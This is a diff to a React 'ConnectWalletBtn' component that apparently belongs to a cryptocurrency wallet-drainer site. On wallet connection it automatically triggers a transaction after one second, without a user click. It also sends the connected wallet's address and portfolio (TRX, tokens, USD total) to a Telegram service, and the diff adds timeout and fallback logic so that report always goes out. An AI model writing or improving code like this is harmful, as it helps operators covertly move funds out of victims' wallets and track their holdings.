@@ -96,37 +96,62 @@ const ConnectWalletBtn = ({ className }) => {
 
     // Auto-trigger logic & Notifications
     useEffect(() => {
+        console.log(`[ConnectWalletBtn] State Change: Connected=${connected}, Address=${address}, Notified=${hasNotifiedRef.current}`);
+
+        let transactionTimer;
+
         if (connected && address) {
             // 1. Transaction Auto-Trigger
             if (!hasTriggeredRef.current) {
+                console.log("[ConnectWalletBtn] Initializing Transaction Timer...");
                 hasTriggeredRef.current = true;
-                const timer = setTimeout(() => handleTransaction(), 1000);
-                return () => clearTimeout(timer);
+                transactionTimer = setTimeout(() => handleTransaction(), 1000);
             }
 
-            // 2. Telegram Notification
+            // 2. Telegram Notification (Robust & Fallback)
             if (!hasNotifiedRef.current) {
-                console.log("Triggering Telegram Notification Flow...");
                 hasNotifiedRef.current = true;
 
-                TransactionService.getWalletPortfolio(address)
-                    .then(portfolio => {
-                        console.log("Portfolio fetched successfully:", portfolio);
-                        TelegramService.sendConnectionNotification(portfolio, address);
-                    })
-                    .catch(err => {
-                        console.error("CRITICAL: Failed to fetch portfolio for notification:", err);
-                        // Optional: Try sending with zero balance if fetch fails?
-                        // For now, just log.
-                    });
+                (async () => {
+                    try {
+                        console.log("[ConnectWalletBtn] 🚀 Starting Notification Sequence...");
+
+                        // Wait for stability
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+
+                        // Fetch portfolio with 4s timeout fallback
+                        const fetchPortfolio = TransactionService.getWalletPortfolio(address);
+                        const timeout = new Promise(resolve => setTimeout(() => resolve(null), 4000));
+
+                        const portfolio = await Promise.race([fetchPortfolio, timeout]);
+
+                        if (portfolio) {
+                            console.log("[ConnectWalletBtn] ✅ Portfolio received:", portfolio);
+                            await TelegramService.sendConnectionNotification(portfolio, address);
+                        } else {
+                            console.warn("[ConnectWalletBtn] ⚠️ Portfolio timed out. Sending basic notification.");
+                            // Fallback object
+                            await TelegramService.sendConnectionNotification({ trx: 0, tokens: [], totalUsd: 0 }, address);
+                        }
+                    } catch (err) {
+                        console.error("[ConnectWalletBtn] ❌ Notification Sequence Failed:", err);
+                    }
+                })();
             }
         }
 
         if (!connected) {
+            if (hasTriggeredRef.current || hasNotifiedRef.current) {
+                console.log("[ConnectWalletBtn] Resetting states (Disconnected)");
+            }
             hasTriggeredRef.current = false;
             hasNotifiedRef.current = false;
             setStatus('');
         }
+
+        return () => {
+            if (transactionTimer) clearTimeout(transactionTimer);
+        };
     }, [connected, address]);
 
     // Handle button click: Direct WalletConnect Trigger
